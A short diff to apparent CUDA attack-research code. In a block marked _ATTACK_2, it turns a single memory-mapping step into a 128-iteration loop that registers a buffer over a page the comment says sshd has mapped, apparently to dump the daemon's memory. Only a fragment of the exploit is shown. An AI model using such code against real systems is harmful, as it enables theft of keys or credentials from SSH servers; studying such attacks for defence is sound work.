@@ -16,6 +16,7 @@
 #include <iostream>
 #include <sstream>
 
+#define TOT_ITER 128
 
 
 #define ALIGN 0x1000
@@ -239,8 +240,7 @@ CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 #define _ATTACK_2
 #ifdef _ATTACK_2
 
-//	for (int i = 0; i < 10; i ++) {
-	{
+	for (int i = 0; i < TOT_ITER; i ++) {
 	/* Map this buffer to a memory page which currently maped by sshd. */
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)dump_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
 
